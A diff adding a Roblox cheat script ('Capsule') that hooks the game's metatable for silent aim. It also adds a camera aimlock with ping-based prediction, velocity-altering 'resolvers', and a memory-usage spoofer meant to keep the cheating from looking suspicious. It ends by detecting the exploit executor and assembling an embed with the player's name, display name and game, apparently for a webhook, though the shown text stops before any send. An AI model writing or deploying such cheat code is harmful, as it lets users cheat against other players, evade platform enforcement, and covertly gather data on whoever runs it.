@@ -1,0 +1,751 @@
+if not _G.CapsuleLockScriptLoaded then -- leave this here, so if i execute twice it won't lag and will only update the above stuff if edited :)
+    _G.CapsuleLockScriptLoaded = true
+
+----------------------
+
+local Prey = nil
+local Plr  = nil
+
+local Players, Client, Mouse, RS, Camera =
+    game:GetService("Players"),
+    game:GetService("Players").LocalPlayer,
+    game:GetService("Players").LocalPlayer:GetMouse(),
+    game:GetService("RunService"),
+    game:GetService("Workspace").CurrentCamera
+
+local Circle       = Drawing.new("Circle")
+local TracerCircle = Drawing.new("Circle")
+
+Circle.Color           = Color3.new(1,1,1)
+Circle.Thickness       = 1
+Circle.Transparency = 0.5
+TracerCircle.Color     = Color3.new(1,1,1)
+TracerCircle.Thickness = 1
+TracerCircle.Transparency = 0.5
+
+local UpdateFOV = function ()
+    if (not Circle and not TracerCircle) then
+        return Circle and TracerCircle
+    end
+    TracerCircle.Visible  = getgenv().Capsule.TracerFOV.Visible
+    TracerCircle.Radius   = getgenv().Capsule.TracerFOV.Radius * 3
+    TracerCircle.Filled = getgenv().Capsule.TracerFOV.Filled
+    TracerCircle.Position = Vector2.new(Mouse.X, Mouse.Y + (game:GetService("GuiService"):GetGuiInset().Y))
+    
+    Circle.Visible  = getgenv().Capsule.SilentFOV.Visible
+    Circle.Radius   = getgenv().Capsule.SilentFOV.Radius * 3
+    Circle.Filled = getgenv().Capsule.SilentFOV.Filled
+    Circle.Position = Vector2.new(Mouse.X, Mouse.Y + (game:GetService("GuiService"):GetGuiInset().Y))
+    return Circle and TracerCircle
+end
+
+RS.Heartbeat:Connect(UpdateFOV)
+
+local WallCheck = function(destination, ignore)
+    local Origin    = Camera.CFrame.p
+    local CheckRay  = Ray.new(Origin, destination - Origin)
+    local Hit       = game.workspace:FindPartOnRayWithIgnoreList(CheckRay, ignore)
+    return Hit      == nil
+end
+
+local WTS = function (Object)
+    local ObjectVector = Camera:WorldToScreenPoint(Object.Position)
+    return Vector2.new(ObjectVector.X, ObjectVector.Y)
+end
+
+local IsOnScreen = function (Object)
+    local IsOnScreen = Camera:WorldToScreenPoint(Object.Position)
+    return IsOnScreen
+end
+
+local FilterObjs = function (Object)
+    if string.find(Object.Name, "Gun") then
+        return
+    end
+    if table.find({"Part", "MeshPart", "BasePart"}, Object.ClassName) then
+        return true
+    end
+end
+
+local ClosestPlrFromMouse = function()
+    local Target, Closest = nil, 1/0
+    
+    for _ ,v in pairs(Players:GetPlayers()) do
+    	if getgenv().Capsule.Silent.WallCheck then
+    		if (v.Character and v ~= Client and v.Character:FindFirstChild("HumanoidRootPart")) then
+    			local Position, OnScreen = Camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
+    			local Distance = (Vector2.new(Position.X, Position.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+    
+    			if (Circle.Radius > Distance and Distance < Closest and OnScreen) and WallCheck(v.Character.HumanoidRootPart.Position, {Client, v.Character}) then
+    				Closest = Distance
+    				Target = v
+    			end
+    		end
+    	else
+    		if (v.Character and v ~= Client and v.Character:FindFirstChild("HumanoidRootPart")) then
+    			local Position, OnScreen = Camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
+    			local Distance = (Vector2.new(Position.X, Position.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+    
+    			if (Circle.Radius > Distance and Distance < Closest and OnScreen) then
+    				Closest = Distance
+    				Target = v
+    			end
+    		end
+    	end
+    end
+    return Target
+end
+
+local ClosestPlrFromMouse2 = function()
+    local Target, Closest = nil, 1/0
+    
+    for _ ,v in pairs(Players:GetPlayers()) do
+    	if (v.Character and v ~= Client and v.Character:FindFirstChild("HumanoidRootPart")) then
+        	if getgenv().Capsule.Tracer.WallCheck then
+        		local Position, OnScreen = Camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
+        		local Distance = (Vector2.new(Position.X, Position.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+        
+        		if (Distance < Closest and OnScreen) and WallCheck(v.Character.HumanoidRootPart.Position, {Client, v.Character}) then
+        			Closest = Distance
+        			Target = v
+        		end
+                elseif getgenv().Capsule.Tracer.UseCircleRadius then
+            		local Position, OnScreen = Camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
+            		local Distance = (Vector2.new(Position.X, Position.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+                    if (TracerCircle.Radius > Distance and Distance < Closest and OnScreen) and WallCheck(v.Character.HumanoidRootPart.Position, {Client, v.Character}) then
+            			Closest = Distance
+            			Target = v
+                    end
+        	    else
+        			local Position, OnScreen = Camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
+        			local Distance = (Vector2.new(Position.X, Position.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+        
+        			if (Distance < Closest and OnScreen) then
+        				Closest = Distance
+        				Target = v
+        			end
+        		end
+            end
+        end
+    return Target
+end
+
+local GetClosestBodyPart = function (character)
+    local ClosestDistance = 1/0
+    local BodyPart = nil
+    
+    if (character and character:GetChildren()) then
+        for _,  x in next, character:GetChildren() do
+            if FilterObjs(x) and IsOnScreen(x) then
+                local Distance = (WTS(x) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+                if (Circle.Radius > Distance and Distance < ClosestDistance) then
+                    ClosestDistance = Distance
+                    BodyPart = x
+                end
+            end
+        end
+    end
+    return BodyPart
+end
+
+local GetClosestBodyPartV2 = function (character)
+    local ClosestDistance = 1/0
+    local BodyPart = nil
+    
+    if (character and character:GetChildren()) then
+        for _,  x in next, character:GetChildren() do
+            if FilterObjs(x) and IsOnScreen(x) then
+                local Distance = (WTS(x) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+                if (Distance < ClosestDistance) then
+                    ClosestDistance = Distance
+                    BodyPart = x
+                end
+            end
+        end
+    end
+    return BodyPart
+end
+
+Mouse.KeyDown:Connect(function(Key)
+    local Keybind = getgenv().Capsule.Tracer.Key:lower() -- tracer enable and disable (no notifs/notifications)
+    if (Key == Keybind) then
+        if getgenv().Capsule.Tracer.Enabled == true then
+            IsTargetting = not IsTargetting
+            if IsTargetting then
+                Plr = ClosestPlrFromMouse2()
+            else
+                if Plr ~= nil then
+                    Plr = nil
+                    IsTargetting = false
+                end
+            end
+        end
+    end
+end)
+
+Mouse.KeyDown:Connect(function(Key)
+    local Keybind = getgenv().Capsule.Silent.Keybind:lower()
+    if (Key == Keybind) and getgenv().Capsule.Silent.UseKeybind == true then
+            if getgenv().Capsule.Silent.Enabled == true then
+				getgenv().Capsule.Silent.Enabled = false
+                if getgenv().Capsule.Both.SendNotification then
+                    game.StarterGui:SetCore(
+                        "SendNotification",
+                        {
+                            Title = "Capsule",
+                            Text = "Disabled Silent Aim",
+                            Icon = "",
+                            Duration = 0.5
+                        }
+                    )
+                end
+            else
+				getgenv().Capsule.Silent.Enabled = true
+                if getgenv().Capsule.Both.SendNotification then
+                    game.StarterGui:SetCore(
+                        "SendNotification",
+                        {
+                            Title = "Capsule",
+                            Text = "Enabled Silent Aim",
+                            Icon = "",
+                            Duration = 0.5
+                        }
+                    )
+                end
+            end
+        end
+    end
+)
+
+
+Mouse.KeyDown:Connect(function(Key)
+    local Keybind = getgenv().Capsule.Both.UnderGroundKey:lower()
+    if (Key == Keybind) and getgenv().Capsule.Both.UseUnderGroundKeybind == true then
+            if getgenv().Capsule.Both.UnderGroundResolver == true then
+				getgenv().Capsule.Both.UnderGroundResolver = false
+                if getgenv().Capsule.Both.SendNotification then
+                    game.StarterGui:SetCore(
+                        "SendNotification",
+                        {
+                            Title = "Capsule",
+                            Text = "Disabled UnderGround Resolver",
+                            Icon = "",
+                            Duration = 0.5
+                        }
+                    )
+                end
+            else
+				getgenv().Capsule.Both.UnderGroundResolver = true
+                if getgenv().Capsule.Both.SendNotification then
+                    game.StarterGui:SetCore(
+                        "SendNotification",
+                        {
+                            Title = "Capsule",
+                            Text = "Enabled UnderGround Resolver",
+                            Icon = "",
+                            Duration = 0.5
+                        }
+                    )
+                end
+            end
+        end
+    end
+)
+
+Mouse.KeyDown:Connect(function(Key)
+    local Keybind = getgenv().Capsule.Both.DetectDesyncKey:lower()
+    if (Key == Keybind) and getgenv().Capsule.Both.UseDetectDesyncKeybind == true then
+            if getgenv().Capsule.Both.DetectDesync == true then
+				getgenv().Capsule.Both.DetectDesync = false
+                if getgenv().Capsule.Both.SendNotification then
+                    game.StarterGui:SetCore(
+                        "SendNotification",
+                        {
+                            Title = "Capsule",
+                            Text = "Disabled Desync Resolver",
+                            Icon = "",
+                            Duration = 0.5
+                        }
+                    )
+                end
+            else
+				getgenv().Capsule.Both.DetectDesync = true
+                if getgenv().Capsule.Both.SendNotification then
+                    game.StarterGui:SetCore(
+                        "SendNotification",
+                        {
+                            Title = "Capsule",
+                            Text = "Enabled Desync Resolver",
+                            Icon = "",
+                            Duration = 0.5
+                        }
+                    )
+                end
+            end
+        end
+    end
+)
+
+local grmt = getrawmetatable(game)
+local backupindex = grmt.__index
+setreadonly(grmt, false)
+
+grmt.__index = newcclosure(function(self, v)
+    if (getgenv().Capsule.Silent.Enabled and Mouse and tostring(v) == "Hit") then
+        if Prey and Prey.Character then
+    		if getgenv().Capsule.Silent.PredictMovement then
+    			local endpoint = game.Players[tostring(Prey)].Character[getgenv().Capsule.Silent.Part].CFrame + (
+    				game.Players[tostring(Prey)].Character[getgenv().Capsule.Silent.Part].Velocity * getgenv().Capsule.Silent.PredictionVelocity
+    			)
+    			return (tostring(v) == "Hit" and endpoint)
+    		else
+    			local endpoint = game.Players[tostring(Prey)].Character[getgenv().Capsule.Silent.Part].CFrame
+    			return (tostring(v) == "Hit" and endpoint)
+    		end
+        end
+    end
+    return backupindex(self, v)
+end)
+
+RS.Heartbeat:Connect(function()
+	if getgenv().Capsule.Silent.Enabled then
+	    if Prey and Prey.Character and Prey.Character:WaitForChild(getgenv().Capsule.Silent.Part) then
+            if getgenv().Capsule.Both.DetectDesync == true and Prey.Character:WaitForChild("HumanoidRootPart").Velocity.magnitude > getgenv().Capsule.Both.DesyncDetection then            
+                pcall(function()
+                    local TargetVel = Prey.Character[getgenv().Capsule.Silent.Part]
+                    TargetVel.Velocity = Vector3.new(0, 0, 0)
+                    TargetVel.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                end)
+            end
+            if getgenv().Capsule.Silent.AntiGroundShots == true and Prey.Character:FindFirstChild("Humanoid") == Enum.HumanoidStateType.Freefall then
+                pcall(function()
+                    local TargetVelv5 = Prey.Character[getgenv().Capsule.Silent.Part]
+                    TargetVelv5.Velocity = Vector3.new(TargetVelv5.Velocity.X, (TargetVelv5.Velocity.Y * 0.5), TargetVelv5.Velocity.Z)
+                    TargetVelv5.AssemblyLinearVelocity = Vector3.new(TargetVelv5.Velocity.X, (TargetVelv5.Velocity.Y * 0.5), TargetVelv5.Velocity.Z)
+                end)
+            end
+            if getgenv().Capsule.Both.UnderGroundResolver == true then            
+                pcall(function()
+                    local TargetVelv2 = Prey.Character[getgenv().Capsule.Silent.Part]
+                    TargetVelv2.Velocity = Vector3.new(TargetVelv2.Velocity.X, 0, TargetVelv2.Velocity.Z)
+                    TargetVelv2.AssemblyLinearVelocity = Vector3.new(TargetVelv2.Velocity.X, 0, TargetVelv2.Velocity.Z)
+                end)
+            end
+	    end
+	end
+    if getgenv().Capsule.Tracer.Enabled == true then
+        if getgenv().Capsule.Both.DetectDesync == true and Plr and Plr.Character and Plr.Character:WaitForChild(getgenv().Capsule.Tracer.Part) and Plr.Character:WaitForChild("HumanoidRootPart").Velocity.magnitude > getgenv().Capsule.Both.DesyncDetection then
+            pcall(function()
+                local TargetVelv3 = Plr.Character[getgenv().Capsule.Tracer.Part]
+                TargetVelv3.Velocity = Vector3.new(0, 0, 0)
+                TargetVelv3.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+            end)
+        end
+        if getgenv().Capsule.Both.UnderGroundResolver == true and Plr and Plr.Character and Plr.Character:WaitForChild(getgenv().Capsule.Tracer.Part)then
+            pcall(function()
+                local TargetVelv4 = Plr.Character[getgenv().Capsule.Tracer.Part]
+                TargetVelv4.Velocity = Vector3.new(TargetVelv4.Velocity.X, 0, TargetVelv4.Velocity.Z)
+                TargetVelv4.AssemblyLinearVelocity = Vector3.new(TargetVelv4.Velocity.X, 0, TargetVelv4.Velocity.Z)
+            end)
+        end
+    end
+end)
+
+RS.RenderStepped:Connect(function()
+	if getgenv().Capsule.Silent.Enabled then
+        if getgenv().Capsule.Silent.CheckIf_KO == true and Prey and Prey.Character then 
+            local KOd = Prey.Character:WaitForChild("BodyEffects")["K.O"].Value
+            local Grabbed = Prey.Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
+            if KOd or Grabbed then
+                Prey = nil
+            end
+        end
+	end
+    if getgenv().Capsule.Tracer.Enabled == true then
+        if getgenv().Capsule.Tracer.CheckIf_KO == true and Plr and Plr.Character then 
+            local KOd = Plr.Character:WaitForChild("BodyEffects")["K.O"].Value
+            local Grabbed = Plr.Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
+            if KOd or Grabbed then
+                Plr = nil
+                IsTargetting = false
+            end
+        end
+		if getgenv().Capsule.Tracer.DisableTargetDeath == true and Plr and Plr.Character:FindFirstChild("Humanoid") then
+			if Plr.Character.Humanoid.health < 4 then
+				Plr = nil
+				IsTargetting = false
+			end
+		end
+		if getgenv().Capsule.Tracer.DisableLocalDeath == true and Plr and Plr.Character:FindFirstChild("Humanoid") then
+			if Client.Character.Humanoid.health < 4 then
+				Plr = nil
+				IsTargetting = false
+			end
+		end
+        if getgenv().Capsule.Tracer.DisableOutSideCircle == true and Plr and Plr.Character and Plr.Character:WaitForChild("HumanoidRootPart") then
+            if
+            TracerCircle.Radius <
+                (Vector2.new(
+                    Camera:WorldToScreenPoint(Plr.Character.HumanoidRootPart.Position).X,
+                    Camera:WorldToScreenPoint(Plr.Character.HumanoidRootPart.Position).Y
+                ) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+             then
+                Plr = nil
+                IsTargetting = false
+            end
+        end
+		if getgenv().Capsule.Tracer.PredictMovement and Plr and Plr.Character and Plr.Character:FindFirstChild(getgenv().Capsule.Tracer.Part) then
+			if getgenv().Capsule.Tracer.UseShake then
+				local Main = CFrame.new(Camera.CFrame.p,Plr.Character[getgenv().Capsule.Tracer.Part].Position + Plr.Character[getgenv().Capsule.Tracer.Part].Velocity * getgenv().Capsule.Tracer.PredictionVelocity +
+				Vector3.new(
+					math.random(-getgenv().Capsule.Tracer.ShakeValue, getgenv().Capsule.Tracer.ShakeValue),
+					math.random(-getgenv().Capsule.Tracer.ShakeValue, getgenv().Capsule.Tracer.ShakeValue),
+					math.random(-getgenv().Capsule.Tracer.ShakeValue, getgenv().Capsule.Tracer.ShakeValue)
+				) * 0.1)
+				Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().Capsule.Tracer.Smoothness, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+			else
+    			local Main = CFrame.new(Camera.CFrame.p,Plr.Character[getgenv().Capsule.Tracer.Part].Position + Plr.Character[getgenv().Capsule.Tracer.Part].Velocity * getgenv().Capsule.Tracer.PredictionVelocity)
+    			Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().Capsule.Tracer.Smoothness, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+			end
+		elseif getgenv().Capsule.Tracer.PredictMovement == false and Plr and Plr.Character and Plr.Character:FindFirstChild(getgenv().Capsule.Tracer.Part) then
+			if getgenv().Capsule.Tracer.UseShake then
+				local Main = CFrame.new(Camera.CFrame.p,Plr.Character[getgenv().Capsule.Tracer.Part].Position +
+				Vector3.new(
+					math.random(-getgenv().Capsule.Tracer.ShakeValue, getgenv().Capsule.Tracer.ShakeValue),
+					math.random(-getgenv().Capsule.Tracer.ShakeValue, getgenv().Capsule.Tracer.ShakeValue),
+					math.random(-getgenv().Capsule.Tracer.ShakeValue, getgenv().Capsule.Tracer.ShakeValue)
+				) * 0.1)
+				Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().Capsule.Tracer.Smoothness, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+		    else
+    			local Main = CFrame.new(Camera.CFrame.p,Plr.Character[getgenv().Capsule.Tracer.Part].Position)
+    			Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().Capsule.Tracer.Smoothness, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+		    end
+		end
+	end
+end)
+
+task.spawn(function ()
+    while task.wait() do
+    	if getgenv().Capsule.Silent.Enabled then
+            Prey = ClosestPlrFromMouse()
+    	end
+        if Plr then
+            if getgenv().Capsule.Tracer.Enabled and (Plr.Character) and getgenv().Capsule.Tracer.ClosestPart then
+                getgenv().Capsule.Tracer.Part = tostring(GetClosestBodyPartV2(Plr.Character))
+            end
+        end
+        if Prey then
+            if getgenv().Capsule.Silent.Enabled and (Prey.Character) and getgenv().Capsule.Silent.ClosestPart then
+                getgenv().Capsule.Silent.Part = tostring(GetClosestBodyPart(Prey.Character))
+            end
+        end
+    end
+end)
+
+local Script = {Functions = {}}
+    Script.Functions.getToolName = function(name)
+        local split = string.split(string.split(name, "[")[2], "]")[1]
+        return split
+    end
+    Script.Functions.getEquippedWeaponName = function()
+        if (Client.Character) and Client.Character:FindFirstChildWhichIsA("Tool") then
+           local Tool =  Client.Character:FindFirstChildWhichIsA("Tool")
+           if string.find(Tool.Name, "%[") and string.find(Tool.Name, "%]") and not string.find(Tool.Name, "Wallet") and not string.find(Tool.Name, "Phone") then
+              return Script.Functions.getToolName(Tool.Name)
+           end
+        end
+        return nil
+    end
+    RS.RenderStepped:Connect(function()
+    if Script.Functions.getEquippedWeaponName() ~= nil then
+        local WeaponSettings = getgenv().Capsule.GunFOV[Script.Functions.getEquippedWeaponName()]
+        if WeaponSettings ~= nil and getgenv().Capsule.GunFOV.Enabled == true then
+            getgenv().Capsule.SilentFOV.Radius = WeaponSettings.FOV
+        else
+            getgenv().Capsule.SilentFOV.Radius = getgenv().Capsule.SilentFOV.Radius
+        end
+    end
+end)
+
+--[[ old auto prediction stuff
+if getgenv().Capsule.Silent.AutoPrediction == true then
+    pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
+    split = string.split(pingvalue,'(')
+    ping = tonumber(split[1])
+    if ping > 190 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.206547
+    elseif ping > 180 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.19284
+    elseif ping > 170 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.1923111 
+    elseif ping > 160 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.1823111
+    elseif ping > 150 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.171
+    elseif ping > 140 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.165773
+    elseif ping > 130 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.156692
+    elseif ping > 120 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.143765
+    elseif ping > 110 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.1455
+    elseif ping > 100 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.130340
+    elseif ping > 90 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.136
+    elseif ping > 80 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.1347
+    elseif ping > 70 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.119
+    elseif ping > 60 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.12731
+    elseif ping > 50 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.127668
+    elseif ping > 40 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.125
+    elseif ping > 30 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.11
+    elseif ping > 20 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.109
+    elseif ping > 10 then
+        getgenv().Capsule.Silent.PredictionVelocity = 0.97
+    end
+end
+]]
+
+if getgenv().Capsule.Silent.AutoPrediction == true then
+    RS.RenderStepped:Connect(function() -- new silent auto prediction
+        local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
+        local Value = tostring(ping)
+        local pingValue = Value:split(" ")
+        local PingNumber = pingValue[1]
+        Capsule.Silent.PredictionVelocity = PingNumber / 1000 + _G.PRED
+    end)
+end
+
+if getgenv().Capsule.Tracer.AutoPrediction == true then
+    RS.RenderStepped:Connect(function() -- new tracer auto prediction
+        local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
+        local Value = tostring(ping)
+        local pingValue = Value:split(" ")
+        local PingNumber = pingValue[1]
+        Capsule.Tracer.PredictionVelocity = PingNumber / 1000 + _G.PRED
+    end)
+end
+
+local PerformanceStats = game:GetService("CoreGui"):WaitForChild("RobloxGui"):WaitForChild("PerformanceStats")
+
+local MemLabel
+local color,
+    color1,
+    color2,
+    color3,
+    color4,
+    color5,
+    color6,
+    color7,
+    color8,
+    color9,
+    color10,
+    color11,
+    color12,
+    color13,
+    color14,
+    color15,
+    color16,
+    color17,
+    color18,
+    color19
+for I, Child in next, PerformanceStats:GetChildren() do
+    if Child.StatsMiniTextPanelClass.TitleLabel.Text == "Mem" then
+        MemLabel = Child.StatsMiniTextPanelClass.ValueLabel
+        color = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_0
+        color1 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_1
+        color2 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_2
+        color3 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_3
+        color4 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_4
+        color5 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_5
+        color6 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_6
+        color7 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_7
+        color8 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_8
+        color9 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_9
+        color10 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_10
+        color11 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_11
+        color12 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_12
+        color13 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_13
+        color14 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_14
+        color15 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_15
+        color16 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_16
+        color17 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_17
+        color18 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_18
+        color19 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_19
+        break
+    end
+end
+MemLabel:GetPropertyChangedSignal("Text"):Connect(
+    function()
+        if Capsule.Spoofer.MemorySpoofer == true then
+            MemLabel.Text = math.random(Capsule.Spoofer.MemoryLeast, Capsule.Spoofer.MemoryMost) / 100 .. " MB"
+            color.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color1.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color2.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color3.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color4.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color5.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color6.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color7.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color8.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color9.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color10.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color11.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color12.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color13.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color14.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color15.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color16.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color17.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color18.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+            color19.BackgroundColor3 = Capsule.Spoofer.MemoryTabColor
+        end
+    end
+)
+
+--[[local PingLabel -- ping spoofer stuff that i disabled (useless makes ping tab look buggy, more sus)
+for I, Child in next, PerformanceStats:GetChildren() do
+    if Child.StatsMiniTextPanelClass.TitleLabel.Text == "Ping" then
+        PingLabel = Child.StatsMiniTextPanelClass.ValueLabel
+        color = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_0
+        color1 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_1
+        color2 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_2
+        color3 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_3
+        color4 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_4
+        color5 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_5
+        color6 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_6
+        color7 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_7
+        color8 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_8
+        color9 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_9
+        color10 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_10
+        color11 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_11
+        color12 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_12
+        color13 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_13
+        color14 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_14
+        color15 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_15
+        color16 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_16
+        color17 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_17
+        color18 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_18
+        color19 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_19
+        break
+    end
+end
+PingLabel:GetPropertyChangedSignal("Text"):Connect(
+    function()
+        if Capsule.Spoofer.PingSpoofer == true then
+            local textrandom = math.random(Capsule.Spoofer.PingLeast, Capsule.Spoofer.PingMost) / 100
+            PingLabel.Text = textrandom .. " ms"
+            color.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color1.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color2.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color3.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color4.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color5.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color6.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color7.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color8.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color9.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color10.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color11.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color12.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color13.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color14.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color15.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color16.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color17.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color18.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            color19.BackgroundColor3 = Capsule.Spoofer.PingTabColor
+            if game.PlaceId == 9825515356 then
+                game:GetService("ReplicatedStorage").MainEvent:FireServer("GetPing", textrandom)
+            end
+        end
+    end
+) --]]
+
+    game.StarterGui:SetCore("SendNotification",{
+			Title = "Capsule Injected!";
+			Text = "Have fun closet cheating.";
+			Duration = math.huge;
+            Button1 = "Dismiss";
+		})
+
+    print("")
+else
+    print("")
+end
+
+-------------------------------------------
+
+local plr = game.Players.LocalPlayer
+local OSTime = os.time()
+local Time = os.date('!*t', OSTime)
+
+local function getexploit()
+    local exploit =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "SirHurt V4") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "Krnl") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getreg()['CalamariLuaEnv'] and "Calamari") or
+        (unit and "Unit") or
+        (isexecutorclosure and "Script-Ware V2") or
+        ("Undetectable")
+    return exploit
+end
+local Content = ""
+local Embed = {
+            ["title"] = "**Capsule Closet Cheating Lock**",
+            ["description"] = "Name: "..plr.Name.."\nDisplay Name: "..plr.DisplayName.."\nExploit: "..getexploit().."\nGame: https://www.roblox.com/games/"..game.PlaceId,
+            ["type"] = "rich",
+            ["color"] = tonumber(000000),
+                    ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432"
+            },
+            ["image"] = {
+                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username="..plr.Name
+            },
